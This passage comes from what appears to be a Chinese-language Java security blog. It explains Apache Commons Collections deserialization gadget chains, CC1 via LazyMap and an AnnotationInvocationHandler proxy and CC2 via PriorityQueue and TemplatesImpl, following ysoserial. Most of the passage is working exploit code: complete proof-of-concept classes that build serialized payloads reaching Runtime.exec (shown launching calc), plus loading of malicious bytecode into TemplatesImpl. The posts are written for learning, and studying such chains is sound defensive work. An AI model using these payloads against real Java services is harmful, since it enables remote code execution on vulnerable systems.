Comparator&lt;I&gt;, Serializable &#123; private final Transformer&lt;? super I, ? extends O&gt; transformer; public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,final Comparator&lt;O&gt; decorated) &#123; this.decorated = decorated; this.transformer = transformer; &#125; public int compare(final I obj1, final I obj2) &#123; final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125; &#125; compare方法调用了transformer.transform()，transformer可控，那么将InvokerTransformer传递给transformer就会调用InvokerTransformer.transform()。 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates,&quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates,_bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); new TransformingComparator(newTransformer).compare(templates,&quot;templates&quot;);&#125; 运行代码： PriorityQueue之后便是找什么地方调用了compare方法，来到PriorityQueue类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123; private final Comparator&lt;? super E&gt; comparator; private int size = 0; public boolean offer(E e) &#123; if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true; &#125; public PriorityQueue(int initialCapacity,Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; &#125; siftDownUsingComparator方法调用了comparator.compare(x, (E) c)，comparator可控，那么我们找在哪调用了siftDownUsingComparator方法，发现siftDown方法调用了参数x可控，那么我们找在哪调用了siftDown方法，发现在heapify方法中调用了，并且把queue[i]传递给x，那我们就要看怎么把templates赋值到queue。在offer方法当i == 0就可以把templates赋值到queue，但是当i不等于0时就会调用siftUp方法，会触发我们的调用链，所以为了它在调用offer方法的时候不触发调用链，我们在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中，利用反射在templates赋值到queue之后，再把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中。 1234567891011121314151617181920212223242526272829303132333435363738//获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, _bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); //利用InvokerTransformer类获取newTransformer方法。 InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); //在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中 TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); //new 一个PriorityQueue对象将transformingComparator传递给comparator属性 PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.offer(templates); priorityQueue.offer(templates); //把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中 Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,newTransformer); PriorityQueue.readObject() 在PriorityQueue.readObject方法中调用了heapify方法，所以在priorityQueue对象反序列化时就会调用heapify方法 12345678910111213private void readObject(java.io.ObjectInputStream s throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify(); &#125; poc: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import com.sun.org.apache.xalan.internal.xsltc.trax.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Transformer;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.*;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Comparator;import java.util.PriorityQueue;public class cc2 &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;priorityQueue.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException &#123; //获取一个TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); //读取恶意代码的字节码 byte[] code = Files.readAllBytes(Paths.get(&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;)); //将字节码数组存放在二维数组中 byte[][] _bytecodes = &#123;code&#125;; //获取TemplatesImpl的Class对象 Class c = templates.getClass(); //获取_name属性 Field name = c.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); //将_name设置为任意 name.set(templates, &quot;ok&quot;); //获取_bytecodes属性 Field bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); //将存放恶意代码字节码的二维数组传递给_bytecodes属性 bytecodes.set(templates, _bytecodes); //获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。 Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); InvokerTransformer newTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.offer(templates); priorityQueue.offer(templates); Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass(); Field transformer = aClass.getDeclaredField(&quot;transformer&quot;); transformer.setAccessible(true); transformer.set(transformingComparator,newTransformer); //Serialize(priorityQueue); unSerialize(&quot;priorityQueue.txt&quot;) &#125;&#125; 反序列化：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化Commons Collections(一)","slug":"20211228","date":"2021-12-28T07:34:26.000Z","updated":"2022-01-10T07:44:49.375Z","comments":false,"path":"2021/12/28/20211228/","link":"","permalink":"https://self209.github.io/2021/12/28/20211228/","excerpt":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。","text":"本文通过分析ysoserial工具中的CommonsCollections1 Gadget chain，复现漏洞，来学习Commons Collections反序列化漏洞。 漏洞环境： java：Java SE 8 Development Kit 8u65 commons-collections：3.2.1 gradle：implementation group: ‘commons-collections’, name: ‘commons-collections’, version: ‘3.2.1’ ysoserial Gadget chain： 12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 执行类InvokerTransformer.transform()InvokerTransformer.transform() 12345678910111213141516171819202122232425262728293031323334353637public class InvokerTransformer implements Transformer, Serializable &#123; /** The method name to call */ private final String iMethodName; /** The array of reflection parameter types */ private final Class[] iParamTypes; /** The array of reflection arguments */ private final Object[] iArgs; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125; &#125; 直接来看关键代码，这里使用反射调用方法，并且传递的参数都可控。transform接收一个对象input，获取input对象的Class对象赋值到cls，获取cls对象的方法，通过invoke调用，iMethodName，iParamTypes，iArgs都可以通过构造函数传递。 123Class cls = input.getClass();Method method = cls.getMethod(iMethodName, iParamTypes);return method.invoke(input, iArgs); 既然都是可控的，那我们就利用InvokerTransformer.transform()来执行命令调用计算器试试。 1234567//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。InvokerTransformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、调用transform方法，将Runtime对象R传递进去。invokerTransformer.transform(R); 运行代码： Gadget chain现在执行类已经有了，接下来就要找调用链了，从ysoserial工具的Gadget chain来看，它找了两个与执行类危险方法不同类相同名的方法作为ConstantTransformer.transform()，ChainedTransformer.transform() ConstantTransformer.transform()12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; ConstantTransformer.transform()方法是接收一个对象input，返回一个对象iConstant，iConstant可以通过构造函数控制。 ChainedTransformer.transform()1234567891011121314151617181920212223242526272829303132public class ChainedTransformer implements Transformer, Serializable &#123; /** The transformers to call in turn */ private final Transformer[] iTransformers; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param transformers the transformers to chain, not copied, no nulls */ public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; ChainedTransformer.transform()方法是接收一个对象，然后遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象。 刚开始接触这两个方法，从功能上来看一个返回固定对象(这个对象可控)，一个类似于链式调用，并不清楚这两个方法在Gadget chain起什么作用，没关系我们先按照上一篇文章所讲的寻找Gadget chain的方法来寻找与执行类相连的类。 在LazyMap类下的get方法调用了factory.transform(key)。 LazyMap.get()123456789101112131415161718192021222324public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = factory; &#125; public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125; &#125; get方法接收一个对象key，然后判断是否包含指定的键，false的话就会调用factory.transform(key)。看看factory是否可控，发现可以通过构造函数传递，但是并不能直接new，需要通过静态方法decorate()，factory的类型是Transformer，InvokerTransformer实现了Transformer接口，所以可以将InvokerTransformer对象传递给factory，那么当我们调用get方法并且传递一个Runtime对象时不就又实现invokerTransformer.transform(R);了。上代码 12345678910//首先获取一个Runtime对象Runtime R = Runtime.getRuntime();//尝试使用InvokerTransformer.transform()来执行命令调用计算器//1、new一个InvokerTransformer对象将Runtime的exec方法,参数类型，通过构造函数传递进去。类型改为Transformer，decorate要什么参数类型我们最好就传什么类型。Transformer invokerTransformer =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);//2、decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//3、调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,invokerTransformer);r.get(R); 运行代码： 接下来就是找什么地方调用了get方法，ysoserial Gadget chain中是在AnnotationInvocationHandler类下的invoke方法中调用了get，AnnotationInvocationHandler是动态代理类，invoke方法是当proxy代理对象调用方法时自动调用的。这里需要对动态代理有一定的理解 AnnotationInvocationHandler.invoke()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues; &#125; public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result; &#125; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125; &#125; &#125; 在AnnotationInvocationHandler类下的invoke方法中调用了memberValues.get()方法，memberValues是构造方法传递的一个Map对象是可控的，而调用decorate静态方法构造的LazyMap对象，它刚好返回Map类型。 那我们现在就要考虑如何调用到memberValues.get(member)方法，首先他会获取proxy代理对象调用方法的方法名,如果调用equals就会进入第一个if，并且当你调用有参方法时就会进入第二个if报错，也就是说我们的proxy代理对象需要调用一个无参方法，才会调用到memberValues.get(member);，无参方法这个应该可以找到，那我们再看看member，他是一个String类型，是获取proxy代理对象调用方法的方法名，而根据前面的链LazyMap.get(Runtime对象)，我们需要接收的是一个Runtime对象,这就陷入了僵局。 山穷水尽疑无路，柳暗花明又一村我们来回顾一下调用链需要满足的条件： 调用链所以类都要实现Serializable 调用链的传递类型要相同 现在有两个问题： Runtime类不能序列化。 memberValues.get(member)，member类型不一致。 遇到问题不要慌，把问题列出来一个一个想办法解决。 这就是为什么前面会出现ChainedTransformer.transform()，ConstantTransformer.transform()这两个类的原因，这两个类的transform方法完美解决了上面的两个问题，可以说是全场最佳。下面就来看看这两个类是如何解决上面这两个问题的。 我们先来解决Runtime类不能序列化。 将Runtime类转为可序列化形式Runtime类 123456789101112public class Runtime &#123; public static Runtime getRuntime() &#123; return currentRuntime; &#125; private Runtime() &#123;&#125; public Process exec(String command) throws IOException &#123; return exec(command, null, null); &#125; &#125; Runtime类没有实现Serializable接口，无法序列化，InvokerTransformer类实现了Serializable接口，所以我们就可以运用反射机制，调用exec方法再将其转换为InvokerTransformer的形式，这里要注意，Runtime类的构造方法需要通过静态方法getRuntime调用，所以我们需要先获取Runtime类getRuntime方法，再invoke调用getRuntime获取Runtime对象，再获取Runtime类的exec方法，最后调用exec方法。 12345678910//获取Runtime类的Class 对象Class C = Runtime.class;//获取getRuntime方法Method getRuntimeMethod = C.getMethod(&quot;getRuntime&quot;,null);//invoke调用getRuntimeMethod方法，获取Runtime对象。getRuntime是无参静态方法，所以传递两个null就行，返回值是一个Object类型，我们把他强转为getRuntimeRuntime r = (Runtime) getRuntimeMethod.invoke(null,null);//获取Runtime类的exec方法Method execMethod = C.getMethod(&quot;exec&quot;,String.class);//调用exec方法execMethod.invoke(r,&quot;calc&quot;); 运行代码： 将其转换为InvokerTransformer的形式， 1234Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 代码执行： InvokerTransformer形式的Runtime调用不就跟链式调用一样，先传一个Runtime.class到InvokerTransformer的transform方法中，返回一个Method getRuntimeMethod对象，再把Method getRuntimeMethod对象传到下一个InvokerTransformer的transform方法中，返回一个Runtime r对象，再把Runtime r对象传到下一个InvokerTransformer的transform方法中，实现计算器调用。这是不是和前面提到的ChainedTransformer.transform()方法，遍历调用iTransformers数组内，对象的transform方法，并且将返回值传递给下一个调用transform方法的对象，完美契合。 运用ChainedTransformer.transform()方法实现Runtime.getRuntime().exec()1234567Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; new ChainedTransformer(transformers).transform(Runtime.class); 代码执行： 解决member类型不一致现在，Runtime类不能序列化的问题解决了，再来看看member类型不一致问题，想象一下，当LazyMap通过构造函数赋值给memberValues，那么memberValues.get(member)调用的就是LazyMap.get(key)，member就传递到了key，调用LazyMap.get(key)，因为通过LazyMap.decorate(map,invokerTransformer)将invokerTransformer赋值给了factory，factory.transform(key)就相当于调用ChainedTransformer.transform()，key就传递到了object，但是member是String类型，而ChainedTransformer.transform需要接收一个Runtime.class才能执行代码。前面提到ConstantTransformer.transform()方法是接收一个对象input，不管接收的input是什么对象，都返回一个iConstant对象，iConstant可以通过构造函数控制。那我们是不是可以合理运用一下把Runtime.class通过ConstantTransformer的构造函数传递给iConstant，这样当String类型传递到ChainedTransformer.transform方法后，调用ConstantTransformer.transform()把iConstant返回给下一个InvokerTransformer的transform方法，形成了一个替换。 ConstantTransformer.transform() 12345678910111213141516171819202122232425262728public class ConstantTransformer implements Transformer, Serializable &#123; /** The closures to call in turn */ private final Object iConstant; /** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param constantToReturn the constant to return each time */ public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125;&#125; 直接上代码 12345678910111213141516//new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。ConstantTransformer对象负责把String类型换成Runtime.classTransformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;;//new 一个ChainedTransformer对象Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers);//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;();//调用decorate静态方法构造LazyMap对象，它返回Map类型。Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer);//定义一个String类型的变量，模拟一下String member = &quot;member&quot;;r.get(member); 运行代码： Map(Proxy).entrySet()遇到的问题都解决了，那我们接着找调用链，invoke方法是当proxy代理对象调用任意方法时自动调用的，并且得是无参方法才能调用memberValues.get(member)，那我们就得先获取InvocationHandler对象，再创建proxy代理对象，AnnotationInvocationHandler是私有类，所以需要通过反射获取AnnotationInvocationHandler Class对象，再获取构造方法，再构造InvocationHandler对象。 1234567891011 //获取AnnotationInvocationHandler Class对象Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);//获取构造方法Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);//设置访问权限AnnotationInvocationHandlerConstructor.setAccessible(true);//InvocationHandler 对象InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r);//创建代理对象Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); proxyMap对象调用任意方法的时候，就会去调用invocationHandler对象的invoke方法，那么我们就要想办法找一个可以传递Map类型对象的类，并且还得有无参方法。 入口类AnnotationInvocationHandler.readObject()AnnotationInvocationHandler类重写了readObject方法，并且readObject方法调用了memberValues.entrySet()无参方法，memberValues是Map类型，可以通过构造方法控制，那我们是不是可以将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo，当反序列化ooo对象时，调用readObject()，memberValues是proxyMap对象，当代码执行到memberValues.entrySet()时，就是调用proxyMap.entrySet()，就会触发invocationHandler对象invoke方法，invocationHandler对象的memberValues等于r ，当调用到memberValues.get(member)时，就是调用r.get(member)这样就把整条链连接起来了。 最后完整的调用链代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.*;import java.net.URL;import java.util.HashMap;import java.util.Map;public class cc1Serialize &#123; public static void Serialize(Object object) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ooo.txt&quot;)); oos.writeObject(object); &#125; public static Object unSerialize(String FileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(FileName)); return ois.readObject(); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException &#123; //new 一个Transformer[]数组，将InvokerTransformer对象传递进去，形成链式调用。 Transformer[] transformers = new Transformer[]&#123; //ConstantTransformer对象负责把String类型换成Runtime.class new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; //new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法 Transformer chainedTransformer = (Transformer) new ChainedTransformer(transformers); //decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key); Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //调用decorate静态方法构造LazyMap对象，它返回Map类型。 Map&lt;Object,Object&gt; r = LazyMap.decorate(map,chainedTransformer); //获取AnnotationInvocationHandler Class对象 Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //获取构造方法 Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); //设置访问权限 AnnotationInvocationHandlerConstructor.setAccessible(true); //InvocationHandler 对象 InvocationHandler invocationHandler = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,r); //创建代理对象 Map proxyMap = (Map) Proxy.newProxyInstance(r.getClass().getClassLoader(),r.getClass().getInterfaces(),invocationHandler); //将proxyMap通过构造方法传递给memberValues，构造一个InvocationHandler对象ooo InvocationHandler ooo = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Override.class,proxyMap); &#125;&#125; 序列化ooo对象： 反序列化ooo对象：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化URLDNS","slug":"20211226","date":"2021-12-26T01:34:26.000Z","updated":"2022-02-28T06:03:36.569Z","comments":false,"path":"2021/12/26/20211226/","link":"","permalink":"https://self209.github.io/2021/12/26/20211226/","excerpt":"初次接触java反序列化漏洞，通过分析ysoserial工具中的Gadget 